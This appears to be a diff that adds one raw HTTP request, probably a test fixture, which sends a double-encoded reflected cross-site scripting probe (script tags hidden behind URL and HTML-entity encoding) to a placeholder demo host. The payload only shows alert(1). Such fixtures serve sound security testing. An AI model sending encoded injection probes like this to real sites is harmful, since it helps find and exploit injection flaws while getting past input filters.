@@ -1,0 +1,4 @@
+GET /a?q=%26%23x3C;script%26%23x3E;alert(1)%26%23x3C;/script%26%23x3E; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
